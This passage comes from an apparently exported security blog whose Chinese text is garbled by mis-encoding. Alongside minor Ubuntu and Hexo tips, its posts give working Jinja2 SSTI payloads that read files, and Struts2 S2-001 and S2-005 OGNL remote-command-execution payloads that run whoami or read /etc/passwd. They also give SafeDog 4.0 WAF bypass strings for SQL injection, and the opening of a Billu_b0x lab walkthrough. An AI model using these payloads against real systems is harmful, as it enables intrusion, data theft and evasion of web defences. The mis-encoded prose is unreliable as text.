class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> å¦‚æœè¿‡æ»¤äº†[]ç­‰æ‹¬å·  </p>
<p>  ä½¿ç”¨ <code>__gititem__</code></p>
<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125; </code>       â€“&gt;      <code> &#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785">https://blog.csdn.net/weixin_45669205/article/details/114373785</a></p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/">http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</a></p>
<p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy--1/p/12841941.html</a></p>
<p><a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ssti</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntuå®‰è£…pip2</title>
    <url>/posts/2a2a2884/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ç”¨ universe æºä»“åº“</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu_apt-getå®‰è£…æ—¶æŠ¥é”™</title>
    <url>/posts/e46255d2/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/lib/dpkg/</span><br><span class="line">sudo mv info/ info_bak          # ç°å°†infoæ–‡ä»¶å¤¹æ›´å</span><br><span class="line">sudo mkdir info                 # å†æ–°å»ºä¸€ä¸ªæ–°çš„infoæ–‡ä»¶å¤¹</span><br><span class="line">sudo apt-get update             # æ›´æ–°</span><br><span class="line">sudo apt-get -f install         # ä¿®å¤</span><br><span class="line">sudo mv info/* info_bak/        # æ‰§è¡Œå®Œä¸Šä¸€æ­¥æ“ä½œåä¼šåœ¨æ–°çš„infoæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆä¸€äº›æ–‡ä»¶ï¼Œç°å°†è¿™äº›æ–‡ä»¶å…¨éƒ¨ç§»åˆ°info_bakæ–‡ä»¶å¤¹ä¸‹</span><br><span class="line">sudo rm -rf info                # æŠŠè‡ªå·±æ–°å»ºçš„infoæ–‡ä»¶å¤¹åˆ æ‰</span><br><span class="line">sudo mv info_bak info           # æŠŠä»¥å‰çš„infoæ–‡ä»¶å¤¹é‡æ–°æ”¹å›å</span><br></pre></td></tr></table></figure>

<br>

<p><code>Reference</code></p>
<blockquote>
</blockquote>
]]></content>
      <categories>
        <category>apt-get</category>
      </categories>
      <tags>
        <tag>apt-get</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2å¤ç°s2-005</title>
    <url>/posts/9e0365e7/</url>
    <content><![CDATA[<h3 id="S2-005å¤ç°"><a href="#S2-005å¤ç°" class="headerlink" title="S2-005å¤ç°"></a>S2-005å¤ç°</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ä¿®å¤S2-003æ—¶å­˜åœ¨ç»•è¿‡ï¼ŒS2-003å¯¹# è¿‡æ»¤æ—¶å¿½ç•¥äº†Unicodeç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨\u0023æˆ–è€…å…«è¿›åˆ¶è¿›è¡Œç»•è¿‡</p>
<br>
####  ç¯å¢ƒå‡†å¤‡

<p><code>docker-compose up -d</code></p>
<h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><h4 id="åŸå§‹POC"><a href="#åŸå§‹POC" class="headerlink" title="åŸå§‹POC"></a>åŸå§‹POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;\u0023_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true</span><br><span class="line">&amp;(aaaa)((&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003d\u0023vccc&#x27;)(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&amp;(asdf)((&#x27;\u0023rt.exec(&quot;calc&quot;)&#x27;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
<p>è§£ç å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;#_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true</span><br><span class="line">//è®¾ç½®allowStaticMethodAccessä¸ºtrueï¼Œå¼€å¯åå°±å¯ä»¥æ‰§è¡Œé™æ€æ–¹æ³• (vaaa)ä¸ºéµå¾ªognlè¯­æ³•æ ‘è§„åˆ™</span><br><span class="line">&amp;(aaaa)((&#x27;#context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]=#vccc&#x27;)(#vccc=new java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">//è®¾ç½®denyMethodExecutionä¸ºfalse å…è®¸ognlè‡ªå®šä¹‰å˜é‡</span><br><span class="line">&amp;(asdf)((&#x27;#rt.exec(&quot;calc&quot;)&#x27;)(#rt=@java.lang.Runtime@getRuntime()))=1</span><br><span class="line">//æ‰§è¡Œ calc ç³»ç»Ÿå‘½ä»¤</span><br></pre></td></tr></table></figure>
<p>whoami POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)=true</span><br><span class="line">&amp;(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))</span><br><span class="line">&amp;(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))</span><br><span class="line">&amp;(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))</span><br><span class="line">&amp;(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&amp;(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&amp;(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&amp;(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&amp;(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&amp;(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&amp;(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))</span><br></pre></td></tr></table></figure>
<h4 id="å…³é—­ç¯å¢ƒ"><a href="#å…³é—­ç¯å¢ƒ" class="headerlink" title="å…³é—­ç¯å¢ƒ"></a>å…³é—­ç¯å¢ƒ</h4><p><code>docker-compose down -v</code></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://b1ue.cn/archives/107.html">http://b1ue.cn/archives/107.html</a></p>
<p><a href="https://xz.aliyun.com/t/7966#toc-0">https://xz.aliyun.com/t/7966#toc-0</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/41626959">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2å¤ç°s2-001</title>
    <url>/posts/996ea1fe/</url>
    <content><![CDATA[<h3 id="S2-001å¤ç°"><a href="#S2-001å¤ç°" class="headerlink" title="S2-001å¤ç°"></a>S2-001å¤ç°</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç”¨æˆ·æäº¤è¡¨å•æ•°æ®éªŒè¯å¤±è´¥åï¼Œåç«¯ä¼šä½¿ç”¨OGNLè¡¨è¾¾å¼%{value}å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè§£æ,ä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p>
<h4 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h4><p><code>cd s2-001</code></p>
<p><code>docker-compose build</code></p>
<p><code>docker-compose up -d</code></p>
<p><code>docekr ps</code>æŸ¥çœ‹æ˜¯å¦å¯åŠ¨æˆåŠŸ</p>
<h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><p>è®¿é—®192.168.159.128:8080</p>
<p><img src="/posts/996ea1fe/001-1.PNG"></p>
<p>è¾“å…¥<code>%&#123;1+23&#125;</code>å¾—åˆ°ç»“æœä¸º24 å¯ä»¥åˆ¤æ–­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p><img src="/posts/996ea1fe/001-2.PNG"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
<p>å°†<code>pwd</code>æ¢æˆå¯¹åº”å‘½ä»¤å³å¯æ‰§è¡Œ</p>
<br>

<p>è·å–webè·¯å¾„POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-3.PNG"></p>
<p>æŸ¥çœ‹æƒé™whoami POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e=new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-4.PNG"></p>
<p><code>cat /etc/passwd</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-5.PNG"></p>
<h4 id="å…³é—­ç¯å¢ƒ"><a href="#å…³é—­ç¯å¢ƒ" class="headerlink" title="å…³é—­ç¯å¢ƒ"></a>å…³é—­ç¯å¢ƒ</h4><p><code>docker-compose down -v</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoè®¾ç½®å¤šä¸ªæ ‡ç­¾æˆ–åˆ†ç±»</title>
    <url>/posts/d7c641b4/</url>
    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰å…¨ç‹—4.0 sqliç»•è¿‡</title>
    <url>/posts/d405928/</url>
    <content><![CDATA[<h4 id="and-1-1-ç»•è¿‡"><a href="#and-1-1-ç»•è¿‡" class="headerlink" title="and 1=1 ç»•è¿‡"></a>and 1=1 ç»•è¿‡</h4><p><img src="/posts/d405928/1.png"></p>
<p>æ­£å¸¸ä½¿ç”¨ <code>?id=tom&#39; and 1=1 --+</code>ä¼šè¢«æ‹¦æˆª<br><img src="/posts/d405928/2.png"></p>
<h5 id="ä½¿ç”¨-amp-amp-æ›¿æ¢and"><a href="#ä½¿ç”¨-amp-amp-æ›¿æ¢and" class="headerlink" title="ä½¿ç”¨&amp;&amp;æ›¿æ¢and"></a>ä½¿ç”¨<code>&amp;&amp;</code>æ›¿æ¢and</h5><p><img src="/posts/d405928/3.png"><br>æ— æ³•ç»•è¿‡</p>
<h5 id="ä½¿ç”¨å†…è”æ³¨é‡Š-ï¼11440"><a href="#ä½¿ç”¨å†…è”æ³¨é‡Š-ï¼11440" class="headerlink" title="ä½¿ç”¨å†…è”æ³¨é‡Š/*ï¼11440 */"></a>ä½¿ç”¨å†…è”æ³¨é‡Š<code>/*ï¼11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
<p><img src="/posts/d405928/8.png"><br>å¯ä»¥ç»•è¿‡<br><br></p>
<h5 id="ç»§ç»­ä½¿ç”¨and"><a href="#ç»§ç»­ä½¿ç”¨and" class="headerlink" title="ç»§ç»­ä½¿ç”¨and"></a>ç»§ç»­ä½¿ç”¨and</h5><p>and 0x1</p>
<p>å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<br>
##### httpå‚æ•°æ±¡æŸ“

<p><img src="/posts/d405928/14.png"><br><br></p>
<hr>
<br>

<br>

<h4 id="order-byç»•è¿‡"><a href="#order-byç»•è¿‡" class="headerlink" title="order byç»•è¿‡"></a>order byç»•è¿‡</h4><h5 id="ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡"><a href="#ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡" class="headerlink" title="ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡"></a>ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
<h5 id="ä½¿ç”¨httpå‚æ•°æ±¡æŸ“"><a href="#ä½¿ç”¨httpå‚æ•°æ±¡æŸ“" class="headerlink" title="ä½¿ç”¨httpå‚æ•°æ±¡æŸ“"></a>ä½¿ç”¨httpå‚æ•°æ±¡æŸ“</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
<br>

<hr>
<h4 id="union-select-ç»•è¿‡"><a href="#union-select-ç»•è¿‡" class="headerlink" title="union select ç»•è¿‡"></a>union select ç»•è¿‡</h4><h5 id="å†…è”æ³¨å…¥"><a href="#å†…è”æ³¨å…¥" class="headerlink" title="å†…è”æ³¨å…¥"></a>å†…è”æ³¨å…¥</h5><p>å°è¯•ä½¿ç”¨<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
<p>fuzzè·‘äº†ä¸‹10000-99999éƒ½æ— æ³•ç»•è¿‡</p>
<p><img src="/posts/d405928/5.png"></p>
<br>

<h5 id="æ¢è¡Œç¬¦-æ³¨é‡Š"><a href="#æ¢è¡Œç¬¦-æ³¨é‡Š" class="headerlink" title="æ¢è¡Œç¬¦+æ³¨é‡Š"></a>æ¢è¡Œç¬¦+æ³¨é‡Š</h5><p><img src="/posts/d405928/9.png"></p>
<p>æ— æ³•ç»•è¿‡</p>
<br>

<h5 id="å†…è”æ³¨é‡Š-æ¢è¡Œç¬¦"><a href="#å†…è”æ³¨é‡Š-æ¢è¡Œç¬¦" class="headerlink" title="å†…è”æ³¨é‡Š+æ¢è¡Œç¬¦"></a>å†…è”æ³¨é‡Š+æ¢è¡Œç¬¦</h5><p><img src="/posts/d405928/10.png"></p>
<p><code>tom%27/**/union/*!Â§10440Â§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
<p>fuzzä¸€ä¸‹ï¼Œå‘ç°91625ä»¥åçš„éƒ½å¯ä»¥ç»•è¿‡</p>
<p><img src="/posts/d405928/11.png"></p>
<p><img src="/posts/d405928/12.png"></p>
<h5 id="httpå‚æ•°æ±¡æŸ“"><a href="#httpå‚æ•°æ±¡æŸ“" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
<p><img src="http3.png"></p>
<p><img src="http4.png"></p>
<br>

<hr>
<h5 id="database-ã€user-ç»•è¿‡"><a href="#database-ã€user-ç»•è¿‡" class="headerlink" title="database()ã€user()ç»•è¿‡"></a>database()ã€user()ç»•è¿‡</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
<br>

<p>è¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡å†…è”æ³¨é‡Š ä¸­é—´æ•°å­—æ²¡è¯• éšä¾¿è¾“å…¥äº†å‡ ä¸ª</p>
<p><img src="/posts/d405928/13.png"></p>
<br>

<hr>
<h4 id="information-schemaç»•è¿‡"><a href="#information-schemaç»•è¿‡" class="headerlink" title="information_schemaç»•è¿‡"></a>information_schemaç»•è¿‡</h4><h5 id="ä½¿ç”¨å†…è”æ³¨é‡Š-fuzz"><a href="#ä½¿ç”¨å†…è”æ³¨é‡Š-fuzz" class="headerlink" title="ä½¿ç”¨å†…è”æ³¨é‡Š+fuzz"></a>ä½¿ç”¨å†…è”æ³¨é‡Š+fuzz</h5><p>æ²¡ç»•è¿‡</p>
<h5 id="åˆ©ç”¨httpå‚æ•°æ±¡æŸ“"><a href="#åˆ©ç”¨httpå‚æ•°æ±¡æŸ“" class="headerlink" title="åˆ©ç”¨httpå‚æ•°æ±¡æŸ“"></a>åˆ©ç”¨httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
<p><img src="http5.png"></p>
<br>

<hr>
<h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><h5 id="å†…è”æ³¨é‡Š-fuzz"><a href="#å†…è”æ³¨é‡Š-fuzz" class="headerlink" title="å†…è”æ³¨é‡Š+fuzz"></a>å†…è”æ³¨é‡Š+fuzz</h5><p>updatexml</p>
<p>æ— wafæƒ…å†µä¸‹</p>
<p><img src="/posts/d405928/baocuo1.png"></p>
<p>å¼€å¯å®‰å…¨ç‹—</p>
<p><img src="/posts/d405928/baocuo2.png"></p>
<p>updataxml()ä¼šè¢«æ‹¦æˆªï¼Œä¸­é—´åŠ å†…è”æ³¨é‡Šå¯ä»¥ç»•è¿‡</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo3.png"></p>
<p>ä½†æ˜¯</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>ä¼šè¢«æ‹¦æˆª</p>
<p>æµ‹è¯•äº†ä¸‹ <code>select from ...</code> åé¢åŠ ä¸œè¥¿å°±ä¼šè¢«æ‹¦æˆª</p>
<p>åœ¨from åé¢æ·»åŠ  <code>%23%0a</code>å¯ä»¥ç»•è¿‡</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo4.png"></p>
<br>

<h5 id="httpå‚æ•°æ±¡æŸ“-1"><a href="#httpå‚æ•°æ±¡æŸ“-1" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
<p><img src="http6.png"></p>
<p><img src="http7.png"></p>
<br>

<hr>
<h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><h5 id="httpå‚æ•°æ±¡æŸ“-2"><a href="#httpå‚æ•°æ±¡æŸ“-2" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><img src="http_sleep.png"></p>
<p><img src="/posts/d405928/bool1.png"> </p>
<p><img src="/posts/d405928/bool2.png"></p>
<br>

<br>

<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>åœ¨æ­¤ç‰ˆæœ¬çš„å®‰å…¨ç‹—(4.0.23.13)ä¸­ï¼Œåˆ©ç”¨<strong>httpå‚æ•°æ±¡æŸ“</strong>éƒ½å¯ä»¥ç»•è¿‡</p>
<p>æœ‰äº›ä¹Ÿå¯ä»¥ä½¿ç”¨<strong>å†…è”æ³¨é‡Š</strong>+<strong>fuzz</strong>+<strong>æ¢è¡Œç¬¦</strong>è¿›è¡Œç»•è¿‡</p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs1</title>
    <url>/posts/685229a3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Billu_b0x</title>
    <url>/posts/827ecdf7/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.144</p>
</blockquote>
<h4 id="nmapæ‰«ç½‘æ®µ"><a href="#nmapæ‰«ç½‘æ®µ" class="headerlink" title="nmapæ‰«ç½‘æ®µ"></a>nmapæ‰«ç½‘æ®µ</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
<blockquote>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
</blockquote>
<h4 id="nmapæ‰«ç«¯å£"><a href="#nmapæ‰«ç«¯å£" class="headerlink" title="nmapæ‰«ç«¯å£"></a>nmapæ‰«ç«¯å£</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£</p>
<h4 id="dirsearchæ‰«æç›®å½•"><a href="#dirsearchæ‰«æç›®å½•" class="headerlink" title="dirsearchæ‰«æç›®å½•"></a>dirsearchæ‰«æç›®å½•</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
<blockquote>
<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
</blockquote>
<p>æ‰«å‡º</p>
<p><code>add.php</code>     æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/posts/827ecdf7/add.png"></p>
